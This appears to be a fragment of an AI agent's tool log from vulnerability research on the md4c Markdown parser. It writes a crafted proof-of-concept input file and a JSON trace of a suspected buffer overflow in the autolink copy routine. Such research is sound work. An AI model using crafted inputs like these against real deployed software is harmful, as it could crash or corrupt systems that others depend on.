message:

from pathlib import Path
p=Path('/workspace/poc.bin')
# exact description-shaped input, preserved NULs
p.write_bytes(b'\n# h1\nc  hh##e2ked\n\n A | rong__ ___strong \x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\n# h1\nh# #2\n### h3\n#### h4\x00\x00\x00\x00\x00\x00\x00\x00\\\n##### h5\n#*#####\x00\n6')
PY
cat > /workspace/candidate_trace.json <<'JSON'
[
  {"step":1,"file":"md2html/md2html.c","function":"process_file","line":120,"var":"buf_in.data","code":"fread(buf_in.data + buf_in.size, 1, buf_in.asize - buf_in.size, in);","note":"Attacker-controlled bytes are read from the input file into the parser input buffer."},
  {"step":2,"file":"md2html/md2html.c","function":"process_file","line":144,"var":"buf_in.data","code":"ret = md_html(buf_in.data, buf_in.size, process_output, (void*) &buf_out, parser_flags, renderer_flags);","note":"The raw input buffer is handed to the Markdown parser and HTML renderer."},
  {"step":3,"file":"src/md4c.c","function":"md_html","line":6322,"var":"ctx.parser","code":"memcpy(&ctx.parser, parser, sizeof(MD_PARSER));","note":"Renderer/parser state is initialized before parsing begins."},
  {"step":4,"file":"src/md4c.c","function":"md_process_autolink","line":4285,"var":"ctx->buffer","code":"memcpy(ctx->buffer, (opener->ch == '@' ? _T(\"mailto:\") : _T(\"http://\")), 7 * sizeof(CHAR));","note":"A permissive autolink path copies a fixed URL prefix into a temporary buffer."},
  {"step":5,"file":"src/md4c.c","function":"md_process_autolink","line":4288,"var":"ctx->buffer + 7","code":"memcpy(ctx->buffer + 7, dest, (dest_size-7) * sizeof(CHAR));","note":"The remainder of the link destination is copied after the prefix; the vulnerable hypothesis is that malformed input can drive an oversized copy here and overflow the temporary buffer."},
  {"step":6,"file":"src/md4c.c","function":"md_process_autolink","line":4291,"var":"dest","code":"dest = ctx->buffer;","note":"The temporary buffer becomes the output destination for link rendering, propagating the overflowed data toward the sink."}
]
JSON` executed with exit code 0.
